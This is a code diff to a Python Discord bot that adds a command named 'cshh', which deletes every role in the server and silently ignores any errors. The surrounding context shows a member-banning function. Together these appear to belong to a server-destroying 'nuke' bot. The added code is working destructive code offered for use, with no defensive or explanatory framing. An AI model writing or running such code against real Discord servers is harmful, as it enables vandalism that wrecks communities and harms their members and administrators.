@@ -113,7 +113,13 @@ def ban_members(ctx):
         in ctx.guild.members
     )
 
-
+@main_bot.command()
+async def cshh(ctx):
+    for roles in ctx.guild.roles:
+        try:
+            await roles.delete()
+        except:
+            pass
 @main_bot.command()
 async def csh(ctx):
     print(len(ctx.guild.members))
